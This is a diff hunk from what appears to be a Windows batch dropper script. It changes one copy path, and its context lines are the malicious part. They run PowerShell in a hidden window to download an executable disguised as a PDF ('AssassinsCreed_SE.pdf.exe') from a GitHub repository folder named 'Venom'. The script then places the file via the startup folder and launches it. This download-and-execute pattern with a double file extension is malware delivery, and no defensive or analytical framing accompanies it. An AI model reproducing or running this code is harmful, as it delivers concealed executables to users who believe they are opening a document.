@@ -45,7 +45,7 @@ call :check_internet
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
-copy $startup/AssassinsCreed_SE.pdf.exe $currentDir
+copy $startup/AssassinsCreed_SE.pdf.exe $currentDir/AssassinsCreed_SE.pdf.exe
 
 start AssassinsCreed_SE.pdf.exe
 
